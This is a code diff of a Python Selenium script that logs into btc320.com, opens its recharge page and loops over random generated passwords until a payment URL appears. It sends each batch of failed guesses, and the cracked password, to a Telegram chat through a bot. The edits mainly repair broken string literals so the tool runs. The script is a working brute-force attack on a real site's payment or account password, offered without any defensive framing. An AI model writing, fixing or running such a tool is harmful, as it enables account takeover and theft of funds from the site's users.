@@ -1,14 +1,12 @@
-
 import os
 import time
 import random
 import string
 import telebot
+import chromedriver_autoinstaller
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
-from selenium.common.exceptions import NoSuchElementException
-import chromedriver_autoinstaller
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
@@ -37,6 +35,7 @@ def start_driver():
 def main():
     driver = start_driver()
     try:
+        # Step 1: Login
         driver.get("https://www.btc320.com/pages/user/other/userLogin")
         time.sleep(5)
 
@@ -46,12 +45,14 @@ def main():
         time.sleep(6)
         send_log("✅ Logged in successfully.")
 
+        # Step 2: Go to Recharge Page
         driver.get("https://www.btc320.com/pages/user/recharge/userRecharge")
         time.sleep(6)
         driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("10")
 
         attempt_count = 0
         batch = []
+
         while True:
             pwd = generate_password()
             attempt_count += 1
@@ -65,16 +66,15 @@ def main():
                 current_url = driver.current_url
                 if "rechargePay?sn=" in current_url:
                     for _ in range(100):
-                        send_log(f"✅✅✅ Password mil gaya bhai!
+                        send_log(f"""✅✅✅ Password mil gaya bhai!
 ✅ Password: {pwd}
-✅ URL: {current_url}")
+✅ URL: {current_url}""")
                         time.sleep(0.5)
                     break
 
                 batch.append(pwd)
                 if len(batch) >= 50:
-                    send_log("❌ 50 wrong passwords:
-" + "\n".join(batch))
+                    send_log("❌ 50 wrong passwords:\n" + "\n".join(batch))
                     batch = []
 
             except Exception as e:
